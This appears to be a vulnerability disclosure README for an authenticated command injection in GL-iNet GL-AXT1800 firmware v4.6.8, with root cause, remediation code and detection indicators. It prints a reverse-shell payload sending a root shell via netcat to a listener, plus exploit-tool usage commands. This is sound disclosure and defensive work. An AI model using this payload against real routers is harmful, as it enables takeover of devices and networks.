# Command Injection in GL-iNet GL-AXT1800 Router

## Executive Summary

A command injection vulnerability exists in the GL-iNet GL-AXT1800 router firmware v4.6.8. The vulnerability is present in the `plugins.install_package` RPC method, which fails to properly sanitize user input in package names. Authenticated attackers can exploit this to execute arbitrary commands with root privileges.

## Vulnerability Details

**Vendor:** GL-iNet  
**Product:** GL-AXT1800 (Slate AX) Router  
**Affected Firmware:** v4.6.8  
**Vulnerability Type:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)  
**Attack Vector:** Network  
**Authentication Required:** Yes (Admin web interface credentials)  
**Privileges Required:** Low (authenticated user)  
**User Interaction:** None  
**CVSS Score:** 8.8 (High) - AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Technical Analysis

### Vulnerable Endpoint

The vulnerability exists in the JSON-RPC endpoint at `/rpc` when calling the `plugins.install_package` method:
```json
{
  "jsonrpc": "2.0",
  "id": 11,
  "method": "call",
  "params": [
    "<admin-token>",
    "plugins",
    "install_package",
    {
      "name": ["<package-name>"]
    }
  ]
}
```

### Root Cause

The `install_package` method passes the package name directly to the underlying `/usr/libexec/opkg-call` script without proper sanitization. This allows command injection through:

1. **Backtick Command Substitution**: `` `command` ``
2. **Dollar-Parenthesis Substitution**: `$(command)`

The package name parameter undergoes shell expansion before being passed to the opkg package manager, allowing arbitrary command execution.

### Exploitation Mechanism

**Attack Flow:**

1. Attacker authenticates to the router's web interface
2. Captures the `Admin-Token` session cookie
3. Sends malicious JSON-RPC request with injected commands in package name
4. Commands execute with root privileges
5. Attacker establishes reverse shell or exfiltrates data

**Proof of Concept Payload:**
```bash
`mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc 10.0.0.1 4444 > /tmp/p`
```

This payload:
- Creates a named pipe at `/tmp/p`
- Redirects an interactive shell through netcat
- Establishes a reverse shell to the attacker's listener

## Exploit Tool

### Prerequisites
```bash
pip install requests
```

### Usage

**Basic Exploitation:**
```bash
python authenticated-rce.py \
  --rhost 192.168.8.1 \
  --lhost 10.0.0.1 \
  --lport 4444 \
  --token <admin-token>
```

**With Proxy (for debugging):**
```bash
python authenticated-rce.py \
  --rhost 192.168.8.1 \
  --lhost 10.0.0.1 \
  --lport 4444 \
  --token <admin-token> \
  --proxy http://127.0.0.1:8080 \
  --debug
```

### Parameters

- `--rhost` - Target router IP address (required)
- `--lhost` - Attacker listener IP address (required)
- `--lport` - Attacker listener port (required)
- `--token` - Admin authentication token from web interface (required)
- `--proxy` - HTTP proxy URL for traffic inspection (optional)
- `--debug` - Enable verbose debug output (optional)

### Setup

Before running the exploit, start a netcat listener:
```bash
nc -lvnp 4444
```

### Obtaining the Admin Token

The `Admin-Token` can be captured by:

1. Authenticating to the router web interface
2. Inspecting browser cookies
3. Looking for the `Admin-Token` cookie value

Example cookie:
```
Admin-Token=a1b2c3d4e5f6g7h8i9j0
```

## Impact

### Severity Justification

**High Severity (CVSS 8.8)** - The vulnerability allows complete system compromise:

1. **Root Access**: Commands execute with full root privileges
2. **Persistence**: Attackers can install backdoors via package management
3. **Network Pivot**: Compromised router provides access to internal network
4. **Data Exfiltration**: Router configuration, credentials, and network traffic accessible
5. **Denial of Service**: Attacker can disable router functionality

### Real-World Attack Scenarios

- **Credential Stuffing**: Attackers use leaked/weak admin passwords
- **Phishing**: Social engineering to obtain admin credentials
- **Default Credentials**: Routers with unchanged default passwords
- **Lateral Movement**: Post-exploitation from compromised internal systems

## Affected Versions

**Confirmed Vulnerable:**
- GL-AXT1800 firmware v4.6.8

**Potentially Affected:**
- Other GL-iNet models using similar RPC plugin architecture
- Earlier firmware versions (requires verification)

## Remediation

### Immediate Mitigation

1. **Disable Remote Management**: Restrict web interface to local network only
2. **Strong Authentication**: Use complex admin passwords (20+ characters)
3. **Network Segmentation**: Isolate router management interface
4. **Firmware Updates**: Check for and apply security patches from GL-iNet
5. **Monitor Logs**: Watch for suspicious `install_package` calls

### Vendor Fix Required

GL-iNet should implement proper input sanitization:
```python
# Validate package names against whitelist
import re

def validate_package_name(name):
    # Only allow alphanumeric, dash, underscore, and dot
    if not re.match(r'^[a-zA-Z0-9._-]+$', name):
        raise ValueError("Invalid package name")
    
    # Prevent path traversal
    if '..' in name or '/' in name:
        raise ValueError("Invalid package name")
    
    return name
```

Alternatively, use parameterized execution to prevent shell interpretation:
```python
import subprocess

# Execute without shell expansion
subprocess.run(
    ['opkg', 'install', package_name],
    shell=False,
    check=True
)
```

## Detection

### Network Indicators

Monitor for suspicious RPC calls to `plugins.install_package`:
- Package names containing backticks or `$()`
- Package names with shell metacharacters: `|`, `&`, `;`, `>`
- Unusual network connections from router to external hosts

### Log Indicators

Check router logs for:
```
opkg install `<suspicious-command>`
/usr/libexec/opkg-call install <payload>
```

## Timeline

- **Discovery Date:** November 2025
- **CVE Assignment:** PENDING
- **Public Disclosure:** PENDING
- **Author:** Aleksa Zatezalo

## Responsible Disclosure

This vulnerability was discovered during authorized security research and is being disclosed responsibly to:

1. Assist GL-iNet in developing patches
2. Enable network defenders to implement mitigations
3. Raise awareness of router security issues

## Legal Disclaimer

This tool and documentation are provided for:
- **Authorized security testing only**
- **Educational and research purposes**
- **Responsible vulnerability disclosure**

**Unauthorized access to computer systems is illegal.** The author assumes no liability for misuse of this tool.

## Author

**Aleksa Zatezalo**

## References
- **GL.iNet Security**: https://www.gl-inet.com/security-updates/
- **CWE-78**: https://cwe.mitre.org/data/definitions/78.html
- **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection

## Additional Vulnerabilities

This research also identified a related local command injection vulnerability in `/usr/libexec/opkg-call` (separate CVE pending) due to improper shell variable quoting. See `opkg-call-analysis.md` for technical details.
